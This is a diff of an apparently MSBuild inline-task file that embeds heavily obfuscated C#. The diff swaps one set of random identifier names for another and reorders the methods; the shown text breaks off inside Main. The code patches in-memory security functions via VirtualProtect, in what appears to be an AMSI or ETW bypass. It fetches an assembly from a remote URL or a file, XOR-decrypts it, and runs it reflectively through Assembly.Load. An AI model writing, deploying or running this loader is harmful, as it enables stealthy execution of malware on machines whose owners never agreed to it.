@@ -10,269 +10,251 @@
       <Code Type="Class" Language="cs">
 	      <![CDATA[	  
 
-using System;using System.IO;using System.Net;using System.Text;using System.Reflection;using System.Runtime.InteropServices;using System.Linq;using System.Threading;//This if for MSBuild LOL bin stuff laterusing Microsoft.Build.Framework;using Microsoft.Build.Utilities;public class AmphibologicalRhynchocoela{    private static object[] SemipurposiveCollate = null;
+using System;using System.IO;using System.Net;using System.Text;using System.Reflection;using System.Runtime.InteropServices;using System.Linq;using System.Threading;//This if for MSBuild LOL bin stuff laterusing Microsoft.Build.Framework;using Microsoft.Build.Utilities;public class SoullikePrincelier{    private static object[] ErwinPaperhanger = null;
 	[DllImport("kernel32")]
-    private static extern IntPtr LoadLibrary(string LegaciesBellicism);
+    private static extern IntPtr LoadLibrary(string ForeteachKlephtism);
 	[DllImport("kernel32")]
-    private static extern bool VirtualProtect(IntPtr CancrisocialWeightlessness, UIntPtr SubjectdomIsoenzyme, uint RarietyFriable, out uint TurnscrewPreinspired);
+    private static extern IntPtr GetProcAddress(IntPtr PrimogenousRicercare, string PhotocatalysisColitoxemia);
 	[DllImport("kernel32")]
-    private static extern IntPtr GetProcAddress(IntPtr ReglorifySystemproof, string NonimmanentCordleaf);
-	private static byte[] AtamanInfraocclusion(string url)
+    private static extern bool VirtualProtect(IntPtr CaribbeeAssenting, UIntPtr UnstalkedMacroseismic, uint YataliteDeodorizers, out uint DiminuePseudobenthonic);
+	private static byte[] OverdroveSilkworks()
     {
-        HttpWebRequest PropinquitatisQuinaldine = (HttpWebRequest)WebRequest.Create(url);
-        PropinquitatisQuinaldine.Proxy.Credentials = CredentialCache.DefaultCredentials;
-        PropinquitatisQuinaldine.Method = Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("Aj0g"), "ExtraparentalOracles"));
-        WebResponse MisreprintQuiz = PropinquitatisQuinaldine.GetResponse();
-        MemoryStream ms = new MemoryStream();
-        MisreprintQuiz.GetResponseStream().CopyTo(ms);
-        return ms.ToArray();
+        if (!AngiotenosisEndaortitis())
+            return Convert.FromBase64String(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("PScBKDZVKgwyNStY"), "HabitanOutjet")));
+        return Convert.FromBase64String(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("MTQaLjJdMCw="), "DryopithecinaeNonanimating")));
     }
-	public static void Main(string[] args)
+	private static void PleuralSiderographist()
     {
-        GonnaMachine();
-        QualificationLepero();
-        string PhacochereUnabidingness = "";
-        string[] ChromidiogamyOwner = new string[] { };
-        bool RespellingUnprovident = false;
-        bool GlycerineBandrol = false;
-        string AmaisterBedaff = "";
-        Console.WriteLine(Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("ClQ0Th80BRQdNxkFEkdVThciIxsGXhlSSjsWJCMDGAMcHA=="), "QuinariusPolygynic")));
-        int MiseducativeBallerina = (Convert.ToInt32(Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("YExV"), "StahlismThrivingly"))) * Convert.ToInt32(Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("ew=="), "ClitelliferousAdipsy"))));
-        if (args.Length > 0)
+        IntPtr FuderUmland = OtherwhitherProstatolith(CoxswainedCoked());
+        if (FuderUmland != (IntPtr)0)
         {
-            foreach (string argument in args)
-            {
-                if (argument.ToLower() == Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("Y0wBXVE="), "NacketVelour")) || argument.ToLower() == Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("aQdaUQ=="), "DelegatoryCongregated")))
-                {
-                    RespellingUnprovident = true;
-                    Console.WriteLine(Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("DkU8UzUEAUEVGwQmBAoAHR1HNBwEUzYJHgRCXUM2BwwBDQsDeU4FFhcHCQgaDkMnAQoDSQEJdRoJFlQOARg="), "UnasthmaticSioning")));
-                }
-                if (argument.ToLower() == Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("bgEMHg=="), "CycloidalForbearingness")) || argument.ToLower() == Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("bEEUGhY="), "AlludingNonconcentrically")))
-                {
-                    GlycerineBandrol = true;
-                    int SystoleUnderrepresent = Array.IndexOf(args, argument) + 1;
-                    if (SystoleUnderrepresent < args.Length)
-                    {
-                        string PeriheliumGabendum = args[SystoleUnderrepresent];
-                        if (RespellingUnprovident)
-                            AmaisterBedaff = Encoding.UTF8.GetString(Convert.FromBase64String(PeriheliumGabendum));
-                        else
-                            AmaisterBedaff = PeriheliumGabendum;
-                    }
-                    Console.WriteLine(Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("FFs4TiwEDRYcFBgQPAhTLD0zbxULDRoYHhAAAEwbOwESBgtBOgMMAA9BBQEcREsCYhJU"), "OpenhandedlyRostra")), AmaisterBedaff);
-                }
-                if (argument.ToLower() == Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("fgQOABw="), "StotterelElope")) || argument.ToLower() == Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("aUwFAzoH"), "DaubNonsensitiveness")))
-                {
-                    int SystoleUnderrepresent = Array.IndexOf(args, argument) + 1;
-                    if (SystoleUnderrepresent < args.Length)
-                    {
-                        string PetiteGlairin = args[SystoleUnderrepresent];
-                        if (RespellingUnprovident)
-                            PhacochereUnabidingness = Encoding.UTF8.GetString(Convert.FromBase64String(PetiteGlairin));
-                        else
-                            PhacochereUnabidingness = PetiteGlairin;
-                    }
-                }
-                if (argument.ToLower() == Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("bgkXBQY="), "ChebuleNonsuch")) || argument.ToLower() == Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("YUQMAg4d"), "LimpingnessPostvertebral")))
-                {
-                    int LignosulphiteFlakiest = Array.IndexOf(args, argument) + 1;
-                    int AcceptMalecite = args.Length - LignosulphiteFlakiest;
-                    ChromidiogamyOwner = new String[AcceptMalecite];
-                    for (int i = 0; i < AcceptMalecite; i++)
-                    {
-                        string PetiteGlairinArgs = args[LignosulphiteFlakiest + i];
-                        if (RespellingUnprovident)
-                            ChromidiogamyOwner[i] = Encoding.UTF8.GetString(Convert.FromBase64String(PetiteGlairinArgs));
-                        else
-                            ChromidiogamyOwner[i] = PetiteGlairinArgs;
-                    }
-                }
-            }
-            if (string.IsNullOrEmpty(PhacochereUnabidingness))
-            {
-                CanelaEndarch();
-                Environment.Exit(0);
-            }
-            XanthelasmicSunfish(PhacochereUnabidingness, ChromidiogamyOwner, GlycerineBandrol, AmaisterBedaff, MiseducativeBallerina);
-            Environment.Exit(0);
-        }
-        while (true)
-        {
-            Console.WriteLine(Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("H1YuTzEXFxAaQSxFJh5JEhoRTwIGCAkgSQcAWBwfDBpA"), "DisoxygenateOpisthodome")));
-            Console.WriteLine(Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("CVopSCgdSyINCkYFBx4SJkUWCRILXXdBAwgPBgoCNkVLSBhBBWNMWEY="), "RethankCaffling")));
-            RespellingUnprovident = EncistColossochelys(Console.ReadKey(false).Key);
-            Console.WriteLine(Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("E144TSgaGQEdQyUPEhpJDhBMEBwJU152QQ=="), "HaematiticUnfriableness")));
-            PhacochereUnabidingness = SpasmophilicRadious(Console.ReadLine(), RespellingUnprovident);
-            Console.WriteLine(Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("E1olQS0aSRoNJ0EZDRYeHCkBWAUFHQhOPQ0zSQkBEQExFQwEAElWThxtD0lBUVI="), "HexadiineBailors")));
-            GlycerineBandrol = EncistColossochelys(Console.ReadKey(false).Key);
-            if (GlycerineBandrol)
-            {
-                Console.WriteLine(Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("GlM5TycBHhoHRT8BEVQ9IxNMDwoXT0NRUw=="), "AldononoseKittel")));
-                AmaisterBedaff = SpasmophilicRadious(Console.ReadLine(), RespellingUnprovident);
-            }
-            Console.WriteLine("[?] Input payload args (optional) -> ");
-            ChromidiogamyOwner = SpasmophilicRadious(Console.ReadLine(), RespellingUnprovident).Split(' ');
-            if (PhacochereUnabidingness.Length > 0)
-            {
-                XanthelasmicSunfish(PhacochereUnabidingness, ChromidiogamyOwner, GlycerineBandrol, AmaisterBedaff, MiseducativeBallerina);
-            }
-        }
-    }
-	private static byte[] DesEvacuatorsCruciatederEnquirer()
-    {
-        if (!HimatiaPerineoplasty())
-            return Convert.FromBase64String(Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("JjIKIilAJSorFiBP"), "SticktailWarracoori")));
-        return Convert.FromBase64String(Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("PCgXJCVGJSg="), "IntegrallyBeglitter")));
-    }
-	private static Type PrurigosTrepanning(MethodInfo GibBibliopolical)
-    {
-        return GibBibliopolical.ReflectedType;
-    }
-	private static void QualificationLepero()
-    {
-        IntPtr GangueDaunton = MispagedDisastrous(FrontomallarIntimado());
-        if (GangueDaunton != (IntPtr)0)
-        {
-            Marshal.Copy(DesEvacuatorsCruciatederEnquirer(), 0, GangueDaunton, DesEvacuatorsCruciatederEnquirer().Length);
-            Console.WriteLine(Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("DkUwVSkPDwoLFCEDEgMeHkkeBiENBRAeWi0kPS5z"), "UnmuzzlingRegorging")));
+            Marshal.Copy(OverdroveSilkworks(), 0, FuderUmland, OverdroveSilkworks().Length);
+            Console.WriteLine(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("DkU+SSEWFg4TFh0SEAgoDkkeBRgGDDAKQyg/MDxM"), "UncircumventedDwindled")));
         }
         else
         {
-            Console.WriteLine(Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("ClQ4UyQSNwIEChsLQTUkPS5MPxA8KTYw"), "QuestsCalculatingly")));
+            Console.WriteLine(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("D0k8TDwIGxYbOgsEUiQ5JiR0LiAlICwr"), "ThalliousSecretum")));
         }
     }
-	public static int PinwalesTanneries(int UngarteredMenstruosity)
+	private static byte[] PalaeobotanicallySelaginella(byte[] CoreignerNonnourishing, string TridactylLinolein)
     {
-        ServicePointManager.SecurityProtocol = (SecurityProtocolType)UngarteredMenstruosity;
-        return UngarteredMenstruosity;
+        //byte[] keyBytes = Encoding.UTF8.GetBytes(TridactylLinolein);
+        byte[] HeptamethyleneUndiurnalBytes = new byte[CoreignerNonnourishing.Length];
+        for (int i = 0; i < CoreignerNonnourishing.Length; i++)
+        {
+            HeptamethyleneUndiurnalBytes[i] = (byte)(CoreignerNonnourishing[i] ^ Encoding.UTF8.GetBytes(TridactylLinolein)[i % Encoding.UTF8.GetBytes(TridactylLinolein).Length]);
+        }
+        return HeptamethyleneUndiurnalBytes;
     }
-	private static void ReauthenticatedConcubinal(byte[] AbyeOvertalkatively)
-    {
-        BastardlyUnprosaic(ServiceberryZeme(CrayeDisinteresting(AbyeOvertalkatively)));
-    }
-	private static string SpasmophilicRadious(string PoltroonishlyChaldaic, bool UtilCocreatorship)
-    {
-        if (UtilCocreatorship)
-            PoltroonishlyChaldaic = Encoding.UTF8.GetString(Convert.FromBase64String(PoltroonishlyChaldaic));
-        if (PoltroonishlyChaldaic.Trim().ToLower().Equals(Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("Nw=="), "OlympicsPhagocyte"))))
-            Environment.Exit(0);
-        return PoltroonishlyChaldaic;
-    }
-	private static object BastardlyUnprosaic(MethodInfo GibBibliopolical)
-    {
-        if (PrurigosTrepanning(GibBibliopolical) == GibBibliopolical.ReflectedType)
-            return GibBibliopolical.Invoke(null, SemipurposiveCollate);
-        return SemipurposiveCollate[0];
-    }
-	private static void EscortedMyope(byte[] AbyeOvertalkatively, string AmaisterBedaff)
-    {
-        BastardlyUnprosaic(ServiceberryZeme(CrayeDisinteresting(ChunteredWrong(AbyeOvertalkatively, AmaisterBedaff))));
-    }
-	private static bool HimatiaPerineoplasty()
+	private static bool AngiotenosisEndaortitis()
     {
         if (IntPtr.Size == 4)
             return false;
         return true;
     }
-	private static byte[] BitonalitiesUnsynchronous()
+	private static void SpectresHendecagon(byte[] ScrupulouslyAmblystoma)
     {
-        if (!HimatiaPerineoplasty())
-            return Convert.FromBase64String(Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("JA0/JQ=="), "SendableUnthrone")));
-        return Convert.FromBase64String(Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("Mx5OXg=="), "DiscomposeBlackguard")));
+        HurrahOutedging(GoblinizeCamouflagers(UnmirthfullyNonreinstatement(ScrupulouslyAmblystoma)));
     }
-	private static MethodInfo ServiceberryZeme(Assembly asm)
+	public static int MetemptosisCatallactics(int HygrologyDerivatively)
     {
-        return asm.EntryPoint;
+        ServicePointManager.SecurityProtocol = (SecurityProtocolType)HygrologyDerivatively;
+        return HygrologyDerivatively;
     }
-	private static Assembly CrayeDisinteresting(byte[] OckerEntangledness)
+	private static byte[] RereignVitellarium(string url)
     {
-        return Assembly.Load(OckerEntangledness);
+        HttpWebRequest LotusGustiness = (HttpWebRequest)WebRequest.Create(url);
+        LotusGustiness.Proxy.Credentials = CredentialCache.DefaultCredentials;
+        LotusGustiness.Method = Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("BSQn"), "BastardismInferomedian"));
+        WebResponse UnconfidedSaddlebill = LotusGustiness.GetResponse();
+        MemoryStream ms = new MemoryStream();
+        UnconfidedSaddlebill.GetResponseStream().CopyTo(ms);
+        return ms.ToArray();
     }
-	private static void GonnaMachine()
+	private static void SuccubineNonene(byte[] ScrupulouslyAmblystoma, string LonglinerPlesiomorphic)
     {
-        var EvacuatorsCruciated = BitonalitiesUnsynchronous();
-        uint BromohydrateTelephotography;
-        var DropkickerScutcheon = LoadLibrary(Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("OB0XGQ1CDRYJ"), "VisualizeBorine")));
-        var MicrogasterMolder = GetProcAddress(DropkickerScutcheon, Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("FREFIwQMDRUjGwYaNg=="), "PerfricationSodium")));
-        if (VirtualProtect(MicrogasterMolder, (UIntPtr)EvacuatorsCruciated.Length, 0x40, out BromohydrateTelephotography))
-        {
-            Marshal.Copy(EvacuatorsCruciated, 0, MicrogasterMolder, EvacuatorsCruciated.Length);
-            Console.WriteLine(Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("C1g4VTcaDwwHEgEpBg8FF0kRDw0/HA4QAE8pOzVA"), "PseudolobarOscinidae")));
+        HurrahOutedging(GoblinizeCamouflagers(UnmirthfullyNonreinstatement(PalaeobotanicallySelaginella(ScrupulouslyAmblystoma, LonglinerPlesiomorphic))));
+    }
+	private static void MalaiseIndrawing(string AmtracModel, string[] MetatheticallySidings, bool BenedickUnlobedoded = false, string LonglinerPlesiomorphic = "", int PseudogenusesInverisimilitude = 0)
+    {
+        PleuralSiderographist();
+        MetemptosisCatallactics(PseudogenusesInverisimilitude);
+        if (!string.IsNullOrEmpty(string.Join(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("aA=="), "HoropterDebars")), MetatheticallySidings))) { 
+            Console.WriteLine(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("D1k8VjA+IEoiBCIpTm5S"), "TravellerEvan")) + AmtracModel);
+            Console.WriteLine(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("GU4zWi4bCTsCCx4RAUpPUg=="), "BenzoinNonperjuries")) + string.Join(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("aA=="), "HoropterDebars")), MetatheticallySidings));
         }
-    }
-	private static IntPtr MispagedDisastrous(IntPtr GangueDaunton)
-    {
-        uint VibranciesUnctionless = 0;
-        if (VirtualProtect(GangueDaunton, (UIntPtr)DesEvacuatorsCruciatederEnquirer().Length, 0x40, out VibranciesUnctionless))
+        else 
         {
-            return GangueDaunton;
+           Console.WriteLine(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("D1k8VjA+IEoiBCIpTm5S"), "TravellerEvan")) + AmtracModel);
+           Console.WriteLine(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("GU4zWi4bCTsCCx4RAUpPUg=="), "BenzoinNonperjuries")) + string.Join(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("aA=="), "HoropterDebars")), MetatheticallySidings));
+        }
+        ErwinPaperhanger = new object[] { MetatheticallySidings };
+        if (BenedickUnlobedoded && AmtracModel.ToLower().StartsWith(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("KxsQFQ=="), "CodeclinationExsibilation"))))
+        {
+            SuccubineNonene(RereignVitellarium(AmtracModel), LonglinerPlesiomorphic);
+        }
+        else if (!BenedickUnlobedoded && AmtracModel.ToLower().StartsWith(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("KxsQFQ=="), "CodeclinationExsibilation"))))
+        {
+            SpectresHendecagon(RereignVitellarium(AmtracModel));
+        }
+        else if (!BenedickUnlobedoded && !AmtracModel.ToLower().StartsWith(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("KxsQFQ=="), "CodeclinationExsibilation"))))
+            SpectresHendecagon(OversplashRelitigation(AmtracModel, FileMode.Open));
+        else
+            SuccubineNonene(OversplashRelitigation(AmtracModel, FileMode.Open), LonglinerPlesiomorphic);
+    }
+	private static IntPtr CoxswainedCoked()
+    {
+        return GetProcAddress(LoadLibrary(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("MwgRCEcQBQI="), "RebaitingMusters"))), Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("FQwQCD4CCQ8hFCMXEBs="), "TacamahacaEquivoke")));
+    }
+	private static void NosepieceGazeless()
+    {
+        Console.WriteLine(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("BxYCFRBeRQ=="), "RecrudescenceDrakes")));
+        Console.WriteLine(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("BgcOFRxYTzRGMl9FKHMvQgoWEE9TADUQTyhzWR8TDQpPUwk5BxAHKisfEw0KUU8wfQgDEiBUUxAQDA4dEg8IAxIgSjI="), "StorybookPiqu")));
+        Console.WriteLine(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("DhtYEUVRW1UJBRoOBgwCBD5PEx8SAkEFJwcPCgwWCRdyBhsXGgYAAS8bCUcdCg0Rcg4ZH1MKFR0jB04XCBANCDcbEAEARQAHI1UMBhoHWlFyChsQHAEEEWg="), "RousseauFungible")));
+        Console.WriteLine(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("DxFAERYXW1IjGREaIg8cAAJIEQwhBAAMDQATUgUHARouAAYIAA9BGTsEGUkbDA8THhBFFSQNFxJOCRMIcz0iO1kADxEeEBUHKAVcQSMdEhlzBwhJHwoNHgMeABdtAwtBGgAETQsqP0kdAAIAFRkRGiIPUgoLEU8="), "SemiyearliesMaranham")));
+        Console.WriteLine(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("HRdfHwMVHF9TCBMLCQgXLhELTxIABgQeIAYAH0dDCA0WBgEAAAAAZQYNCEkTIBcaQ0IEHREbIABFAQYAIA9SABBBFUUmFz5JTQYFYRcaCkIDHQsSNwtFGQZDLQwTC0w="), "AcrobatesEremic")));
+        Console.WriteLine(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("DhFdExcPFlREPCANCgEHDw0+RQATFwkICxAWIlkWHQwFTCYKUAIEGxZOBQE3DA4LBxUfchEfUhEAAE4IHDEdBgpJAwU8BAILS0goGxcHcBsGTg8OAD4KBxcBSAcXRBI8FUMPGwYZPwAeBhZIAwEWUyQRBk4LCAIzFwlc"), "ReprehendsPycnial")));
+    }
+	private static object HurrahOutedging(MethodInfo SoftsBallistic)
+    {
+        if (PardiAuroral(SoftsBallistic) == SoftsBallistic.ReflectedType)
+            return SoftsBallistic.Invoke(null, ErwinPaperhanger);
+        return ErwinPaperhanger[0];
+    }
+	private static IntPtr OtherwhitherProstatolith(IntPtr FuderUmland)
+    {
+        uint PresbyteriallyCodiscoverer = 0;
+        if (VirtualProtect(FuderUmland, (UIntPtr)OverdroveSilkworks().Length, 0x40, out PresbyteriallyCodiscoverer))
+        {
+            return FuderUmland;
         }
         else
         {
             return (IntPtr)0;
         }
     }
-	private static byte[] ChunteredWrong(byte[] PoltroonishlyChaldaic, string StreamlikeSeepproof)
+	private static Assembly UnmirthfullyNonreinstatement(byte[] IssuancesThinkableness)
     {
-        //byte[] keyBytes = Encoding.UTF8.GetBytes(StreamlikeSeepproof);
-        byte[] EgomaniacallyComplainantBytes = new byte[PoltroonishlyChaldaic.Length];
-        for (int i = 0; i < PoltroonishlyChaldaic.Length; i++)
-        {
-            EgomaniacallyComplainantBytes[i] = (byte)(PoltroonishlyChaldaic[i] ^ Encoding.UTF8.GetBytes(StreamlikeSeepproof)[i % Encoding.UTF8.GetBytes(StreamlikeSeepproof).Length]);
-        }
-        return EgomaniacallyComplainantBytes;
+        return Assembly.Load(IssuancesThinkableness);
     }
-	private static void XanthelasmicSunfish(string PleasableUnfoldment, string[] RhinogenousEnculturating, bool GlycerineBandroloded = false, string AmaisterBedaff = "", int EnvineyardCaduciary = 0)
+	private static string CaunterCapelets(string CoreignerNonnourishing, bool UncoincidentStenocephalia)
     {
-        PinwalesTanneries(EnvineyardCaduciary);
-        if (!string.IsNullOrEmpty(string.Join(Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("bw=="), "OilbirdsLollardian")), RhinogenousEnculturating)))
-            Console.WriteLine(Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("GEo/QjQ1KVg/MzkJTFRJ"), "CabbagewormAlnico")) + PleasableUnfoldment + Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("Dh0AGQgEPhEBU0pJ"), "OogleaPerspicuous")) + string.Join(Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("bw=="), "OilbirdsLollardian")), RhinogenousEnculturating));
-        else
-        {
-            Console.WriteLine(Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("GEo/QjQ1KVg/MzkJTFRJ"), "CabbagewormAlnico")) + PleasableUnfoldment + Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("Dh0AGQgEPhEBU0pJ"), "OogleaPerspicuous")) + string.Join(Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("bw=="), "OilbirdsLollardian")), RhinogenousEnculturating));
-        }
-        SemipurposiveCollate = new object[] { RhinogenousEnculturating };
-        if (GlycerineBandroloded && PleasableUnfoldment.ToLower().StartsWith(Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("IRoQBQ=="), "InductingUnlaughing"))))
-        {
-            EscortedMyope(AtamanInfraocclusion(PleasableUnfoldment), AmaisterBedaff);
-        }
-        else if (!GlycerineBandroloded && PleasableUnfoldment.ToLower().StartsWith(Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("IRoQBQ=="), "InductingUnlaughing"))))
-        {
-            ReauthenticatedConcubinal(AtamanInfraocclusion(PleasableUnfoldment));
-        }
-        else if (!GlycerineBandroloded && !PleasableUnfoldment.ToLower().StartsWith(Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("IRoQBQ=="), "InductingUnlaughing"))))
-            ReauthenticatedConcubinal(FilmsetZonations(PleasableUnfoldment, FileMode.Open));
-        else
-            EscortedMyope(FilmsetZonations(PleasableUnfoldment, FileMode.Open), AmaisterBedaff);
-    }
-	private static void CanelaEndarch()
-    {
-        Console.WriteLine(Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("BQEOCABXSQ=="), "ProoemionProtocatechualdehyde")));
-        Console.WriteLine(Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("EQYMBRZOUi5OCX9aKUUpSR0bF1JRAgsYSjRPQzQUGQpTSBAcDQo7FysVExANSkUpQAgcBgdJUwwtGwwQCisTBwQYdzM="), "DumbstruckInterdetermination")));
-        Console.WriteLine(Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("DwFfD1lBVFQuEhgMAQsdEj9FCwUACU4VAB4ECTYBFx9PHAAQCAENEQcLFFMnDQwdQQ8CCUEDEQw2B1IdDgcPGQQWCRcdRRIBNkUPCBILWFFBCQsHPBEXCUE="), "SurmountablenessSemiannealed")));
-        Console.WriteLine(Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("DhFOFwERU0wmEQAAAAAdKAJUAgABBB0RFQkgRQoBCgoKDR0IGg5PGhsoGlQQCB0EAg1BCjsJBhxOAhsJSTk7O08LHSocDQIVFgFeVCwZIRFDDQtDDwMFDRseCgpTKxdUBgkWRSg7M0w2AAAdFxMdBQYPVAIKF10="), "ReconciliationsIntraseptal")));
-        Console.WriteLine(Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("HRhBHwIVHF9EGRQAAAATHB4YVAQAMw0BChcEBktEHRsKDQIGBwkSVAAJJEwcDhcJWEUBPQEGARNHHwMCFRhBLh5MDkM0JilIdBoIRBUPFkwDHRoAMxVMGwxBGAoFMFs="), "AllocatedTundagslatta")));
-        Console.WriteLine(Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("HQVYAAYOEFtMIwk3DB0ABw8LYQEUExUEBhUJHlk2FhcKSRoIYQEUEgdJAhMLGRQmCwYdSRoIYQUdBFQFDAAICR1jBxsACBweb1E4FAcdQwMJTB8sCR4BHgsDYRMMQRUFD0ENHh42CBcAHR1HJx4HQQABBkEOBRciFwtA"), "AquaticallyCerning")));
-    }
-	private static byte[] FilmsetZonations(string PoritidaeKukang, FileMode NeovitalismPlutologist)
-    {
-        byte[] EgomaniacallyComplainant = null;
-        using (FileStream fs = new FileStream(PoritidaeKukang, NeovitalismPlutologist, FileAccess.Read))
-        {
-            EgomaniacallyComplainant = new byte[fs.Length];
-            fs.Read(EgomaniacallyComplainant, 0, (int)fs.Length);
-        }
-        return EgomaniacallyComplainant;
-    }
-	private static bool EncistColossochelys(ConsoleKey StruttinglySaleratus)
-    {
-        if (StruttinglySaleratus == ConsoleKey.X)
+        if (UncoincidentStenocephalia)
+            CoreignerNonnourishing = Encoding.UTF8.GetString(Convert.FromBase64String(CoreignerNonnourishing));
+        if (CoreignerNonnourishing.Trim().ToLower().Equals(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("PQ=="), "ElectromassageMeaslesproof"))))
             Environment.Exit(0);
-        return (StruttinglySaleratus == ConsoleKey.Y);
+        return CoreignerNonnourishing;
     }
-	private static IntPtr FrontomallarIntimado()
+	private static MethodInfo GoblinizeCamouflagers(Assembly asm)
     {
-        return GetProcAddress(LoadLibrary(Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("LAQACEoSCQI="), "MisadventurousEarlap"))), Encoding.UTF8.GetString(ChunteredWrong(Convert.FromBase64String("CAMQBj4TAB0xHAkIKAs="), "IncompassionMyceloid")));
+        return asm.EntryPoint;
+    }
+	public static void Main(string[] args)
+    {
+        int PurifiesLogomachic = (Convert.ToInt32(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("YEFa"), "SynaptosomeCryptoneurous"))) * Convert.ToInt32(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("eg=="), "BerhymingStatorhab"))));
+        if (args.Length > 0)
+        {
+            Console.WriteLine(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("GkwyRRwpBQUtCBsZB0VUSREvGx0bcRVPRiwKHSgsDgkVHg=="), "AmoeboidComplexionist")));
+            string LonglinerPlesiomorphic = "";
+            string MeteoroliticCheilodipteridae = "";
+            string[] DeprecationsOverrunningly = new string[] { };
+            bool LabeledFordeal = false;
+            bool BenedickUnlobed = false;
+            ReicingManyatta();
+            foreach (string argument in args)
+            {
+                if (argument.ToLower() == Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("eEMFWlU="), "UngladlyUninterrupted")) || argument.ToLower() == Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("fg5XXw=="), "SlakableLoanable")))
+                {
+                    LabeledFordeal = true;
+                    Console.WriteLine(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("Hls0TCgBAkkOHCEUAxEPEDZQCB4MTSwIHAtwVU4RDwcqFAwIRU0KDAwBIggAE0EQLRUETAYDTh0HC2YHAg0="), "EpilimnionFantad")));
+                }
+                if (argument.ToLower() == Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("ZxkbBw=="), "JatulianDar")) || argument.ToLower() == Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("flgaCR4="), "SubfloraSittidae")))
+                {
+                    BenedickUnlobed = true;
+                    int ThunderpealBagworms = Array.IndexOf(args, argument) + 1;
+                    if (ThunderpealBagworms < args.Length)
+                    {
+                        string RewithdrawalInnocently = args[ThunderpealBagworms];
+                        if (LabeledFordeal)
